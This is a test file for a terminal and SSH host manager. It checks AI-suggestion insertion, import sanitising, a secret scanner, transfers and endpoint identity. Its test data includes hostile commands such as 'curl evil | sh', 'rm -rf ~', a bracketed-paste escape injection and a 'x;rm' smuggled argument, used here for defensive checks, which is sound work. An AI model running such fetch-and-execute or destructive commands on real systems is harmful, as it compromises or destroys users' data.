// Run: npm test  (node --experimental-strip-types --test)
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { ReplyGuard } from './replyGuard.ts'
import { fold, foldMatches } from './foldMatch.ts'
import { isDangerousCommand, planInsert } from './dangerous.ts'
import { scanForSecrets } from './secretScan.ts'
import { endpointKey, hopIdentity } from './endpoint.ts'
import {
  applyFailure, applyProgress, canRetry, clearFinished, markActive, markCancelled, markDone,
  markFailed, netTargetError, parsePort, policyFor, queuedRow, retryJobs, validateForward,
} from './transfers.ts'
import {
  bindingChanged, catalogueProblem, credentialDestinations, isBorrowed, NarrowQueue, reidentify, sameVaultId, SaveQueue,
  sanitizeImport, setVaultFoldsCase, usableImportedId, vaultIdKey, vaultSlotSharing,
} from './tree.ts'
import { clearLocal, emitLocal, onLocal } from './localTerm.ts'
import { defaultLocalRoot, keyPathPlaceholder, localBaseName, setLocalRoot, unsafeTransferName } from './localPath.ts'
import { appShortcut, terminalKeyAction } from './keyChords.ts'
import {
  bracketedNow, isMouseReport, looksLikeTerminalReply, pasteMirrorText, pasteNeedsConfirmNow, planPaste, shouldBroadcast,
  snippetTargets, snippetText, stillApproved,
} from './termInput.ts'
import { LAYER, ModalStack, PressGuard, enterOutcome } from './modalStack.ts'
import { closeConfirmText, liveSessionCount } from './closeGuard.ts'
import {
  effectiveHostColor, folderLabels, inheritedHostColor, jumpDependents, ownColor,
} from './tree.ts'
import { hasPendingLocal } from './localTerm.ts'

const deferred = () => {
  let resolve, reject
  const promise = new Promise((res, rej) => ((resolve = res), (reject = rej)))
  return { promise, resolve, reject }
}

/* The config-check flow from AppLayout, reduced: connect invalidates, a check
   (unless throttled) begins, and the reply only lands while still current. */
async function scenario(settle) {
  const guard = new ReplyGuard()
  const landed = []
  const connect = () => guard.invalidate('s1')
  const check = (d) => {
    const current = guard.begin('s1')
    d.promise.then(
      (v) => current() && landed.push(v),
      (e) => current() && landed.push(`err:${e}`),
    )
  }
  connect()
  const a = deferred()
  check(a) // check A in flight
  connect() // connection dropped and redialled; check B throttled, never begins
  settle(a)
  await new Promise((r) => setTimeout(r, 0))
  return landed
}

test('a reply from before a throttled reconnect is dropped (resolve)', async () => {
  assert.deepEqual(await scenario((d) => d.resolve('A')), [])
})

test('a reply from before a throttled reconnect is dropped (reject)', async () => {
  assert.deepEqual(await scenario((d) => d.reject('boom')), [])
})

test('the latest check still lands; a reused key never revives an old token', () => {
  const g = new ReplyGuard()
  const old = g.begin('s1')
  g.retain(new Set()) // tab closed
  const fresh = g.begin('s1') // id reused
  assert.equal(old(), false)
  assert.equal(fresh(), true)
})

const marked = (text, q) => foldMatches(text, q).map(([s, e]) => text.slice(s, e))

test('expanding lowercase maps back to whole source characters', () => {
  assert.deepEqual(marked('İ', 'i'), ['İ'])
  assert.deepEqual(marked('İİİ Needle x', 'needle'), ['Needle'])
})

test('contextual final sigma matches like the backend', () => {
  assert.deepEqual(marked('ΟΣ', 'ος'), ['ΟΣ'])
})

test('plain case-insensitive matching, all occurrences', () => {
  assert.deepEqual(marked('Show run; show RUN', 'show run'), ['Show run', 'show RUN'])
  assert.deepEqual(marked('abc', ''), [])
})

test('Turkish dotted I and Greek sigma fold like the backend search', () => {
  assert.deepEqual(marked('İSTANBUL office', 'istanbul'), ['İSTANBUL'])
  assert.deepEqual(marked('flight to izmir', 'İzmir'), ['izmir'])
  assert.deepEqual(marked('ΠΑΝΕΠΙΣΤΗΜΙΟ', 'ΠΑΝΕΠΙΣ'), ['ΠΑΝΕΠΙΣ'])
  assert.deepEqual(marked('οδος', 'οδοσ'), ['οδος'])
  // Same strings as the Rust fold tests.
  assert.equal(fold('ΟΣ'), 'οσ')
  assert.equal(fold('İ'), 'i')
})

test('common full case folds (ß, ligatures) match like the backend search', () => {
  assert.deepEqual(marked('Hauptstraße 1', 'STRASSE'), ['straße'])
  assert.deepEqual(marked('STRASSE 2', 'straße'), ['STRASSE'])
  assert.deepEqual(marked('the ﬁle', 'file'), ['ﬁle'])
  assert.deepEqual(marked('GROẞ', 'gross'), ['GROẞ'])
  // Same strings as folding_expands_common_full_folds in Rust.
  assert.equal(fold('Straße'), 'strasse')
  assert.equal(fold('ẞﬃ'), 'ssffi')
})

/* ------------------------------------------------ AI "Insert into terminal" */

test('one-line suggestions insert without their trailing newline', () => {
  assert.deepEqual(planInsert('show interfaces status', false), { kind: 'insert', text: 'show interfaces status', lines: 1 })
  assert.deepEqual(planInsert('uptime\n', false), { kind: 'insert', text: 'uptime', lines: 1 })
  assert.deepEqual(planInsert('uptime\r\n', true), { kind: 'insert', text: 'uptime', lines: 1 })
})

test('multi-line text is inserted only as a bracketed paste, never typed', () => {
  const block = 'ls -la\ncurl -s https://evil/x | sh\nuptime'
  // Without bracketed paste each LF is Enter: refused, not confirmed.
  const off = planInsert(block, false)
  assert.equal(off.kind, 'refuse')
  assert.match(off.reason, /bracketed paste/)
  assert.deepEqual(planInsert(block, true), { kind: 'insert', text: block, lines: 3 })
  // Every kind of line break counts, including the invisible ones.
  for (const br of ['\r', '\x0b', '\x0c', '\u0085', '\u2028', '\u2029']) {
    assert.equal(planInsert(`ls${br}rm -rf ~`, false).kind, 'refuse', JSON.stringify(br))
  }
  // Tabs are text inside a bracketed block.
  assert.equal(planInsert('for i in 1 2; do\n\techo $i\ndone', true).kind, 'insert')
})

test('control characters in a suggestion are refused in every mode', () => {
  for (const bad of ['ls\rrm -rf ~', 'x\x1b[201~curl evil|sh', 'abc\x03', 'a\x15b', 'a\x7f', 'a\u0085b', 'a\u2028b', 'a\tb']) {
    assert.equal(planInsert(bad, false).kind, 'refuse', JSON.stringify(bad))
  }
  // ESC could close the bracket early and run the rest: refused even bracketed.
  for (const bad of ['a\n\x1b[201~rm -rf ~\n', 'a\nb\x03', 'a\nb\u2028']) {
    assert.equal(planInsert(bad, true).kind, 'refuse', JSON.stringify(bad))
  }
  assert.equal(planInsert('', true).kind, 'refuse')
})

test('the insert decision follows the mode at the moment of writing', () => {
  // AiPanel re-plans right before paste(); a remote that turned bracketed
  // paste off while the confirm was open gets a refusal, not a typed block.
  const block = 'a\nb'
  assert.equal(planInsert(block, true).kind, 'insert')
  assert.equal(planInsert(block, false).kind, 'refuse')
})

test('the destructive-command check sees every line of a suggestion', () => {
  assert.ok(isDangerousCommand('show version\nreload in 5'))
  assert.equal(isDangerousCommand('show version'), null)
})

/* ------------------------------------------------------- endpoint identity */

const host = (over) => ({ kind: 'host', id: 'h-1', name: 'fw', hostname: '10.0.0.1', port: 22, username: 'admin', auth: 'password', ...over })

test('same address, different entries: different endpoint keys', () => {
  const none = () => undefined
  const a = endpointKey(host({ id: 'h-prod' }), none)
  const b = endpointKey(host({ id: 'h-lab' }), none)
  assert.notEqual(a, b)
  assert.equal(a, 'host:h-prod=admin@10.0.0.1:22')
})

test('quick connect keys by user@host:port, never by its per-dial id', () => {
  const none = () => undefined
  const one = endpointKey(host({ id: 'qc-abc', hostname: 'FW.example' }), none)
  const two = endpointKey(host({ id: 'qc-def', hostname: 'fw.example' }), none)
  assert.equal(one, 'qc:admin@fw.example:22')
  assert.equal(one, two)
  assert.notEqual(one, endpointKey(host({ id: 'qc-x', hostname: 'fw.example', port: 2222 }), none))
  assert.notEqual(one, endpointKey(host({ id: 'qc-x', hostname: 'fw.example', username: 'readonly' }), none))
})

test('the jump host is part of the identity, resolved like the dialer', () => {
  const bastions = { 'b-1': host({ id: 'b-1', hostname: 'bastion-a' }), 'b-2': host({ id: 'b-2', hostname: 'bastion-b' }) }
  const find = (id) => bastions[id]
  const viaA = endpointKey(host({ id: 'h-1', jumpHostId: 'b-1' }), find)
  const viaB = endpointKey(host({ id: 'h-1', jumpHostId: 'b-2' }), find)
  assert.equal(viaA, 'host:h-1=admin@10.0.0.1:22|via:host:b-1=admin@bastion-a:22')
  assert.notEqual(viaA, viaB)
  // Missing or self-referencing bastions dial direct, so they key as direct.
  assert.equal(endpointKey(host({ id: 'h-1', jumpHostId: 'gone' }), find), 'host:h-1=admin@10.0.0.1:22')
  assert.equal(endpointKey(host({ id: 'h-1', jumpHostId: 'h-1' }), find), 'host:h-1=admin@10.0.0.1:22')
  assert.equal(endpointKey(host({ id: 'local-zsh', local: { profile: 'zsh' } }), find), 'local:zsh')
})

test('repointing a host or editing its bastion starts a new identity', () => {
  const none = () => undefined
  const before = endpointKey(host({ id: 'h-1' }), none)
  assert.notEqual(before, endpointKey(host({ id: 'h-1', hostname: '10.0.0.2' }), none))
  assert.notEqual(before, endpointKey(host({ id: 'h-1', port: 2222 }), none))
  assert.notEqual(before, endpointKey(host({ id: 'h-1', username: 'readonly' }), none))
  const withBastion = (b) => endpointKey(host({ id: 'h-1', jumpHostId: 'b-1' }), () => host({ id: 'b-1', ...b }))
  const base = withBastion({ hostname: 'bastion-a' })
  assert.notEqual(base, withBastion({ hostname: 'bastion-b' }))
  assert.notEqual(base, withBastion({ hostname: 'bastion-a', username: 'root' }))
  assert.notEqual(base, withBastion({ hostname: 'bastion-a', port: 2200 }))
})

test('identity vectors shared with artifacts.rs', () => {
  // Same inputs as identity_vectors_match_the_frontend in Rust.
  assert.equal(hopIdentity('h-1', 'admin', ' FW1.Example.COM ', 22), 'host:h-1=admin@fw1.example.com:22')
  const t = host({ id: 'h-1', hostname: '10.0.0.1', port: 2222, jumpHostId: 'b-1' })
  const b = host({ id: 'b-1', hostname: 'Bastion.lan', username: 'jump' })
  assert.equal(endpointKey(t, () => b), 'host:h-1=admin@10.0.0.1:2222|via:host:b-1=jump@bastion.lan:22')
  assert.equal(endpointKey(host({ id: 'qc-1', username: 'root', hostname: 'Box' }), () => undefined), 'qc:root@box:22')
  assert.equal(hopIdentity('a@b', 'x', 'y', 1), 'qc:x@y:1')
  // Non-ASCII is not case-folded, exactly like to_ascii_lowercase.
  assert.equal(hopIdentity('h', 'u', 'ÄBC', 22), 'host:h=u@Äbc:22')
})

/* ----------------------------------------------------------- secret scanner */

const reasons = (text) => scanForSecrets(text).map((h) => h.reason)

test('network-device secrets are flagged', () => {
  for (const line of [
    'username admin privilege 15 secret 9 $9$abc',
    'snmp-server community s3cr3t RO',
    ' pre-shared-key ascii-text 0 hunter22',
    ' key-string 7 0822455D0A16',
    'tacacs-server key 7 060506324F41',
    'radius-server host 10.1.1.1 key s3cret',
    '<phash>$1$abcdefgh$ijklmnop</phash>',
    'curl -H "Authorization: Bearer abcdef0123456789abcdef"',
    'token eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N',
  ]) {
    assert.ok(reasons(line).length > 0, line)
  }
  assert.deepEqual(reasons('show interfaces status\ninterface Gi0/1\n description uplink'), [])
})

test('a private key body is flagged even without its BEGIN line', () => {
  const body = Array.from({ length: 4 }, (_, i) => 'A'.repeat(63) + String(i)).join('\n')
  assert.ok(reasons(`fw# cat key\n${body}\n-----END OPENSSH PRIVATE KEY-----`).some((r) => r.includes('base64')))
  // Never shows the secret itself.
  assert.ok(scanForSecrets(body).every((h) => !h.preview.includes('AAAA')))
})

/* ----------------------------------------------------------- transfers */

const job = (name, overwrite = 'never') => ({ name, local: `/l/${name}`, remote: `/r/${name}`, overwrite })
const prog = (transferId, bytes) => ({
  sessionId: 's', transferId, root: '/r/dir', filePath: '/r/dir/a', bytesTransferred: bytes,
  totalBytes: 0, direction: 'download', done: false,
})
const fail = (transferId, name) => ({
  sessionId: 's', transferId, root: '/r/dir', name, local: `/l/${name}`, remote: `/r/${name}`,
  reason: 'denied', direction: 'download',
})

test('two transfers of the same source never update each other', () => {
  let list = [queuedRow('a', 's', 'download', job('dir')), queuedRow('b', 's', 'download', job('dir'))]
  list = markActive(markActive(list, 'a'), 'b')
  list = applyProgress(list, prog('b', 500))
  assert.equal(list.find((t) => t.id === 'a').bytesDone, 0)
  assert.equal(list.find((t) => t.id === 'b').bytesDone, 500)
  list = applyFailure(list, fail('a', 'x'))
  assert.equal(list.find((t) => t.id === 'b').failures, undefined)
})

test('a failure that arrives after the row settled is still counted', () => {
  let list = markActive([queuedRow('a', 's', 'download', job('dir'))], 'a')
  list = markFailed(list, 'a', 'copied 0 bytes; 2 item(s) not transferred')
  list = applyFailure(list, fail('a', 'late'))
  assert.equal(list[0].failures.length, 1)
  // ...but a late progress event does not rewind a settled row.
  const done = markDone(markActive([queuedRow('c', 's', 'upload', job('f'))], 'c'), 'c', { bytes: 9, notes: [] })
  assert.equal(applyProgress(done, prog('c', 1))[0].bytesDone, 9)
})

test('retry is offered only once the transfer stopped, with its policy', () => {
  let list = markActive([queuedRow('a', 's', 'download', job('dir', 'confirmed'))], 'a')
  list = applyFailure(list, fail('a', 'x'))
  assert.equal(canRetry(list[0]), false, 'not while still running')
  list = markFailed(list, 'a', 'partial')
  assert.equal(canRetry(list[0]), true)
  assert.deepEqual(retryJobs(list[0]), [{ name: 'x', local: '/l/x', remote: '/r/x', overwrite: 'confirmed' }])
  // Unretryable items (skipped symlinks, unsafe names) carry an empty side.
  const skipped = applyFailure(markFailed(markActive([queuedRow('b', 's', 'download', job('d'))], 'b'), 'b', 'p'),
    { ...fail('b', 'link'), local: '' })
  assert.equal(canRetry(skipped[0]), false)
})

test('cancel settles queued and running rows, and survives clear', () => {
  let list = [queuedRow('a', 's', 'upload', job('f1')), queuedRow('b', 's', 'upload', job('f2'))]
  list = markActive(list, 'a')
  list = markCancelled(list, 'b')
  assert.equal(list[1].status, 'cancelled')
  assert.equal(clearFinished(list).map((t) => t.id).join(), 'a')
  // The running row's command then rejects with the backend's cancel text.
  list = markFailed(list, 'a', 'transfer cancelled')
  assert.equal(list[0].status, 'cancelled')
  assert.equal(list[0].error, undefined)
})

test('overwrite policy follows the existence check, a failed check never clobbers', () => {
  assert.equal(policyFor(false, false), 'never')
  assert.equal(policyFor(null, false), 'never')
  assert.equal(policyFor(true, true), 'confirmed')
  assert.equal(policyFor(true, false), null)
})

test('ports and forwards are validated before IPC', () => {
  assert.equal(parsePort('', 0), 0)
  assert.equal(parsePort('8022', null), 8022)
  assert.equal(parsePort('70000', null), null)
  assert.equal(parsePort('0', null), null)
  assert.equal(parsePort('1e3', null), null)
  assert.match(validateForward('local', '70000', 'h', '22'), /Local port/)
  assert.match(validateForward('local', '', '', '22'), /Remote host/)
  assert.match(validateForward('local', '', 'h', ''), /Remote port/)
  assert.deepEqual(validateForward('local', '', ' 10.0.0.5 ', '443'), { localPort: 0, remoteHost: '10.0.0.5', remotePort: 443 })
  assert.deepEqual(validateForward('socks', '1080', '', ''), { localPort: 1080, remoteHost: '', remotePort: 0 })
})

test('network tool targets mirror the backend rule', () => {
  assert.equal(netTargetError('fw-01.lab'), null)
  assert.equal(netTargetError('2001:db8::1'), null)
  assert.ok(netTargetError(''))
  assert.ok(netTargetError('-f'))
  assert.ok(netTargetError('a b'))
  assert.ok(netTargetError('x;rm'))
})

/* ------------------------------------------------------------------ W4 */

const mkHost = (over = {}) => ({
  kind: 'host', id: 'h-1', name: 'fw1', hostname: '10.0.0.1', port: 22, username: 'admin', auth: 'password',
  ...over,
})

test('a catalogue is checked at every depth, not just its top level', () => {
  assert.equal(catalogueProblem([mkHost(), { kind: 'folder', id: 'f', name: 'F', children: [mkHost({ id: 'h-2' })] }]), null)
  assert.equal(catalogueProblem([]), null)
  assert.match(catalogueProblem({ hosts: [] }), /not a list/)
  assert.match(catalogueProblem([null]), /entry\[0\] is not a host or folder/)
  assert.match(catalogueProblem([{ kind: 'folder', id: 'f', name: 'F' }]), /no children list/)
  assert.match(
    catalogueProblem([{ kind: 'folder', id: 'f', name: 'F', children: [mkHost({ port: '22' })] }]),
    /entry\[0\]\.children\[0\].*invalid port/,
  )
  assert.match(catalogueProblem([mkHost(), mkHost()]), /used twice/)
  assert.match(catalogueProblem([mkHost({ startupCommands: 'ls' })]), /startupCommands has the wrong type/)
  assert.match(catalogueProblem([{ kind: 'gadget', id: 'g' }]), /unknown kind/)
  let deep = [mkHost()]
  for (let i = 0; i < 70; i++) deep = [{ kind: 'folder', id: `f${i}`, name: 'x', children: deep }]
  assert.match(catalogueProblem(deep), /nested too deeply/)
})

test('an import keeps only known fields and holds back self-acting ones', () => {
  const file = [
    mkHost({
      planted: 'x', startupCommands: ['curl evil | sh'], checkConfigOnConnect: true, configCommand: 'show run',
      aiAllowed: true, local: { profile: 'zsh' }, snippets: [{ label: 'a', command: 'ls', slot: 3, extra: 1 }],
    }),
    { kind: 'folder', id: 'f', name: 'F', junk: 1, children: [mkHost({ id: 'h-2', name: 'quiet' })] },
  ]
  const off = sanitizeImport(file, false)
  assert.deepEqual(off.risky.map((r) => r.name), ['fw1'])
  assert.equal(off.risky[0].enables.length, 4)
  const h = off.tree[0]
  for (const f of ['planted', 'startupCommands', 'checkConfigOnConnect', 'configCommand', 'local']) {
    assert.equal(h[f], undefined, f)
  }
  // A declined AI opt-in becomes an explicit opt-out, never "inherit".
  assert.equal(h.aiAllowed, false)
  assert.deepEqual(h.snippets, [{ label: 'a', command: 'ls', slot: 3 }])
  assert.equal(off.tree[1].junk, undefined)
  assert.equal(off.tree[1].children[0].name, 'quiet')
  // Confirmed: kept.
  const on = sanitizeImport(file, true).tree[0]
  assert.deepEqual(on.startupCommands, ['curl evil | sh'])
  assert.equal(on.checkConfigOnConnect, true)
  assert.equal(on.aiAllowed, true)
  assert.deepEqual(on.local, { profile: 'zsh' })
})

test('imported ids never alias an existing one by case or use a reserved namespace', () => {
  const existing = [mkHost({ id: 'h-abc' })]
  const [a, b, c, d] = reidentify(
    [mkHost({ id: 'H-ABC' }), mkHost({ id: 'qc-123' }), mkHost({ id: 'h-\u00e9' }), mkHost({ id: 'h-ok', credentialId: 'H-ABC' })],
    existing,
  )
  assert.notEqual(a.id.toLowerCase(), 'h-abc')
  assert.ok(!b.id.startsWith('qc-'))
  assert.ok(/^[\x21-\x7e]+$/.test(c.id))
  assert.equal(d.id, 'h-ok')
  assert.equal(d.credentialId, a.id, 'a reference follows the rename')
  assert.ok(usableImportedId('h-lq3x'))
  assert.ok(!usableImportedId('local-1') && !usableImportedId('ai:default') && !usableImportedId('h 1'))
})

test('the destinations of a saved password are exactly its current users', () => {
  const tree = [
    mkHost({ id: 'lender', hostname: 'a', port: 22 }),
    mkHost({ id: 'b1', hostname: 'b', credentialId: 'lender' }),
    mkHost({ id: 'other', hostname: 'c' }),
    mkHost({ id: 'b2', hostname: 'b', credentialId: 'lender' }), // same tuple once
  ]
  assert.deepEqual(credentialDestinations(tree, 'lender'), [
    { host: 'a', port: 22, username: 'admin' },
    { host: 'b', port: 22, username: 'admin' },
  ])
  // A host that borrows another's credential does not use its own entry.
  assert.deepEqual(credentialDestinations(tree, 'b1'), [])
  const before = mkHost()
  assert.ok(bindingChanged(before, mkHost({ hostname: '10.0.0.2' })))
  assert.ok(bindingChanged(before, mkHost({ credentialId: 'x' })))
  assert.ok(!bindingChanged(before, mkHost({ name: 'renamed', tag: 't' })))
})

test('a stale pane unsubscribing never drops a newer pane on the same id', () => {
  const got = []
  const off1 = onLocal('s-x', (t) => got.push(`old:${t}`))
  clearLocal('s-x')
  onLocal('s-x', (t) => got.push(`new:${t}`))
  off1() // the old pane's cleanup runs after the new pane subscribed
  emitLocal('s-x', 'hello')
  assert.deepEqual(got, ['new:hello'])
  clearLocal('s-x')
})

test('local path rules follow the local platform', () => {
  assert.equal(localBaseName('/home/u/a\\b.txt', false), 'a\\b.txt')
  assert.equal(localBaseName('C:\\Users\\u\\f.txt', true), 'f.txt')
  assert.equal(localBaseName('C:/Users/u/f.txt', true), 'f.txt')
  // An upload's name is a remote POSIX component.
  assert.equal(unsafeTransferName('a\\b', 'upload', false), false)
  assert.equal(unsafeTransferName('12:30.log', 'upload', true), false)
  // A download's is local.
  assert.equal(unsafeTransferName('12:30.log', 'download', false), false)
  assert.equal(unsafeTransferName('12:30.log', 'download', true), true)
  assert.equal(unsafeTransferName('a\\b', 'download', false), true)
  for (const bad of ['', '.', '..', 'a/b']) assert.equal(unsafeTransferName(bad, 'upload', false), true, bad)
  assert.equal(defaultLocalRoot(false), '/')
  setLocalRoot('D:\\')
  assert.equal(defaultLocalRoot(true), 'D:\\')
})

/* W3b: Tunnel and Network Tools close on an Escape pressed inside them, never
   from a window listener — that one also fired for an alert stacked above. */
test('tunnel and network tools dialogs have no window Escape handler', async () => {
  const { readFileSync } = await import('node:fs')
  for (const f of ['TunnelDialog.tsx', 'NetToolsDialog.tsx']) {
    const src = readFileSync(new URL(`../components/${f}`, import.meta.url), 'utf8')
    assert.ok(!/addEventListener\(\s*'keydown'/.test(src), `${f} still listens on window`)
    assert.ok(/onKeyDown=\{onPanelKey\}/.test(src), `${f} lost its panel Escape handler`)
  }
})

/* W4b: import privacy. */
test('an imported AI opt-out is always kept, an opt-in only with a yes', () => {
  const file = [
    mkHost({ id: 'h-off', name: 'off', aiAllowed: false }),
    mkHost({ id: 'h-on', name: 'on', aiAllowed: true }),
    mkHost({ id: 'h-unset', name: 'unset' }),
  ]
  const declined = sanitizeImport(file, false)
  assert.deepEqual(declined.risky.map((r) => r.name), ['on'], 'an opt-out is not a risk')
  assert.equal(declined.tree[0].aiAllowed, false, 'opt-out kept when declining')
  assert.equal(declined.tree[1].aiAllowed, false, 'declined opt-in is explicit false')
  assert.equal('aiAllowed' in declined.tree[2], false, 'an unset choice stays unset')
  const accepted = sanitizeImport(file, true)
  assert.equal(accepted.tree[0].aiAllowed, false, 'opt-out kept when accepting')
  assert.equal(accepted.tree[1].aiAllowed, true)
})

test('an imported local profile is rebuilt from known fields only', () => {
  const file = [mkHost({ local: { profile: 'zsh', program: '/tmp/evil', args: ['-c', 'x'], env: { A: 1 } } })]
  assert.deepEqual(sanitizeImport(file, true).tree[0].local, { profile: 'zsh' })
  assert.equal(sanitizeImport(file, false).tree[0].local, undefined)
})

/* W4b: one credential-id rule, the vault's. */
test('credential ids compare with the vault rule (folded on Windows, exact elsewhere)', () => {
  const tree = [
    mkHost({ id: 'h-1', hostname: 'a' }),
    mkHost({ id: 'b', hostname: 'b', credentialId: 'H-1' }),
  ]
  try {
    setVaultFoldsCase(true) // Windows
    assert.equal(vaultIdKey('H-Ab'), 'h-ab')
    assert.ok(sameVaultId('H-1', 'h-1'))
    assert.deepEqual(credentialDestinations(tree, 'h-1').map((d) => d.host), ['a', 'b'])
    assert.ok(isBorrowed(tree, 'h-1'), 'H-1 borrows h-1: never deleted from under it')
    const [x] = reidentify([mkHost({ id: 'H-1' })], tree)
    assert.notEqual(vaultIdKey(x.id), 'h-1')

    setVaultFoldsCase(false) // macOS / Linux: two separate entries
    assert.equal(vaultIdKey('H-Ab'), 'H-Ab')
    assert.ok(!sameVaultId('H-1', 'h-1'))
    assert.deepEqual(credentialDestinations(tree, 'h-1').map((d) => d.host), ['a'])
    assert.ok(!isBorrowed(tree, 'h-1'), 'H-1 is a different entry: h-1 may be deleted')
    const [y] = reidentify([mkHost({ id: 'H-1' })], tree)
    assert.equal(y.id, 'H-1', 'a distinct vault id is kept')
    assert.ok(bindingChanged(mkHost({ credentialId: 'H-1' }), mkHost({ credentialId: 'h-1' })))
  } finally {
    setVaultFoldsCase(true)
  }
})

/* W4b: narrowing rides with the save and is retried until one succeeds. */
test('queued narrowing survives a failed save and clears only when carried', () => {
  const q = new NarrowQueue()
  q.add(['lender'])
  const first = q.take()
  // That save failed: the next save (any edit) carries it again.
  q.add([])
  const second = q.take()
  assert.deepEqual([...second.keys()], ['lender'])
  // Queued again while the second save is in flight: an older success
  // must not drop the newer request.
  q.add(['lender', 'other'])
  q.settle(second)
  assert.deepEqual(q.pending().sort(), ['lender', 'other'])
  q.settle(q.take())
  assert.deepEqual(q.pending(), [])
  q.settle(first) // a stale success is harmless
  assert.deepEqual(q.pending(), [])
})


/* W4c: catalogue saves are serialised, coalesced and numbered. */
test('catalogue saves run one at a time, coalesce to the newest tree, and never go backwards', async () => {
  const calls = []
  const gates = []
  const send = (tree, narrow, generation) => {
    calls.push({ tree, narrow, generation })
    const d = deferred()
    gates.push(d)
    return d.promise
  }
  const results = []
  const q = new SaveQueue(send, new NarrowQueue(), (e) => results.push(e), () => 100)
  const done = q.save(['A'], ['lender'])
  q.save(['B'])
  await null
  await null
  assert.equal(calls.length, 1, 'one save in flight')
  assert.deepEqual(calls[0].tree, ['B'], 'queued trees coalesce before sending')
  q.save(['C'])
  q.save(['D'], ['other'])
  assert.equal(calls.length, 1, 'still waiting for the first')
  gates[0].resolve()
  for (let i = 0; i < 5 && calls.length < 2; i++) await null
  assert.equal(calls.length, 2)
  assert.deepEqual(calls[1].tree, ['D'], 'only the newest of C and D is sent')
  assert.deepEqual(calls[1].narrow, ['other'], 'lender was carried by the first save')
  assert.ok(calls[1].generation > calls[0].generation)
  gates[1].resolve()
  await done
  assert.deepEqual(results, [null, null])
  // A failure keeps the narrowing queued for the next save.
  const q2 = new SaveQueue(send, new NarrowQueue(), (e) => results.push(e))
  const p = q2.save(['E'], ['x'])
  await null
  await null
  gates[2].reject(new Error('disk full'))
  await p
  const p2 = q2.save(['F'])
  await null
  await null
  assert.deepEqual(calls[3].narrow, ['x'], 'retried with the next save')
  gates[3].resolve()
  await p2
})

test('a save refused as stale continues above the backend generation, once', async () => {
  const calls = []
  let refuse = true
  const send = async (tree, narrow, generation) => {
    calls.push(generation)
    if (refuse) {
      refuse = false
      throw new Error(`stale catalogue save (generation ${generation}; last saved 5000)`)
    }
  }
  const results = []
  const q = new SaveQueue(send, new NarrowQueue(), (e) => results.push(e), () => 10)
  await q.save(['A'])
  assert.deepEqual(calls, [10, 5001])
  assert.deepEqual(results, [null])
  // Refused twice: reported, not retried forever.
  const always = async (_t, _n, g) => {
    throw new Error(`stale catalogue save (generation ${g}; last saved 9000)`)
  }
  const r2 = []
  await new SaveQueue(always, new NarrowQueue(), (e) => r2.push(e)).save(['A'])
  assert.equal(r2.length, 1)
  assert.ok(String(r2[0]).includes('stale'))
})

test('an import remaps a credential reference spelled in another case where the vault folds', () => {
  try {
    setVaultFoldsCase(true)
    const existing = [mkHost({ id: 'h-lender' })]
    const [lender, borrower] = reidentify(
      [mkHost({ id: 'h-lender', hostname: 'l' }), mkHost({ id: 'h-b', hostname: 'b', credentialId: 'H-LENDER' })],
      existing,
    )
    assert.notEqual(vaultIdKey(lender.id), 'h-lender', 'the imported lender is re-id\'d')
    assert.equal(borrower.credentialId, lender.id, 'the borrower follows it, not the local h-lender')
    setVaultFoldsCase(false)
    const [l2, b2] = reidentify(
      [mkHost({ id: 'h-lender', hostname: 'l' }), mkHost({ id: 'h-b', hostname: 'b', credentialId: 'H-LENDER' })],
      existing,
    )
    assert.notEqual(l2.id, 'h-lender')
    assert.equal(b2.credentialId, 'H-LENDER', 'a distinct entry where the vault is case-sensitive')
  } finally {
    setVaultFoldsCase(true)
  }
})

/* W4d: jump-host references are exact ids, whatever the vault's case rule. */
test('an import keeps a client on the exact jump host it names when h-jump and H-JUMP both exist', () => {
  try {
    for (const folds of [true, false]) {
      setVaultFoldsCase(folds)
      const [lower, upper, client, lowerClient] = reidentify(
        [
          mkHost({ id: 'h-jump', hostname: 'lower-bastion' }),
          mkHost({ id: 'H-JUMP', hostname: 'upper-bastion' }),
          mkHost({ id: 'h-client', hostname: 'target', jumpHostId: 'H-JUMP' }),
          mkHost({ id: 'h-client2', hostname: 'target2', jumpHostId: 'h-jump' }),
        ],
        [],
      )
      assert.equal(lower.id, 'h-jump')
      if (folds) assert.notEqual(vaultIdKey(upper.id), vaultIdKey('h-jump'), 'H-JUMP is re-id\'d where the vault folds')
      else assert.equal(upper.id, 'H-JUMP')
      assert.equal(client.jumpHostId, upper.id, `folds=${folds}: the client stays on H-JUMP`)
      assert.notEqual(client.jumpHostId, lower.id)
      assert.equal(lowerClient.jumpHostId, lower.id)
      // A credential reference spelled exactly follows its exact host too.
      const [, u2, borrower] = reidentify(
        [mkHost({ id: 'h-jump' }), mkHost({ id: 'H-JUMP' }), mkHost({ id: 'h-b', credentialId: 'H-JUMP' })],
        [],
      )
      assert.equal(borrower.credentialId, u2.id)
    }
  } finally {
    setVaultFoldsCase(true)
  }
})

/* ------------------------------------------------------------------ W5 */

const key = (code, mods = {}, k) => ({
  code,
  key: k ?? code.replace(/^Key/, '').replace(/^Digit/, ''),
  ctrlKey: false, shiftKey: false, altKey: false, metaKey: false,
  ...mods,
})

test('tab, ordinal and snippet chords belong to the app even in a focused terminal', () => {
  assert.deepEqual(appShortcut(key('Tab', { ctrlKey: true }, 'Tab')), { kind: 'cycleTab', dir: 1 })
  assert.deepEqual(appShortcut(key('Tab', { ctrlKey: true, shiftKey: true }, 'Tab')), { kind: 'cycleTab', dir: -1 })
  // Ctrl+3..8 would otherwise send ESC/FS/GS/RS/US/DEL to the remote.
  for (let d = 1; d <= 9; d++) {
    assert.deepEqual(appShortcut(key(`Digit${d}`, { ctrlKey: true })), { kind: 'gotoTab', index: d - 1 })
    assert.equal(terminalKeyAction(key(`Digit${d}`, { ctrlKey: true })), 'app')
  }
  // Ctrl+Shift+2 is "@" in e.key on US layouts (xterm would send NUL).
  assert.deepEqual(appShortcut(key('Digit2', { ctrlKey: true, shiftKey: true }, '@')), { kind: 'snippet', slot: 2 })
  assert.equal(terminalKeyAction(key('Digit2', { ctrlKey: true, shiftKey: true }, '@')), 'app')
  assert.deepEqual(appShortcut(key('KeyW', { ctrlKey: true, shiftKey: true })), { kind: 'command', code: 'KeyW' })
  // Plain Ctrl letters stay with the shell (readline owns them).
  assert.equal(appShortcut(key('KeyW', { ctrlKey: true })), null)
  assert.equal(terminalKeyAction(key('KeyW', { ctrlKey: true })), 'pass')
  assert.equal(appShortcut(key('Tab', {}, 'Tab')), null)
})

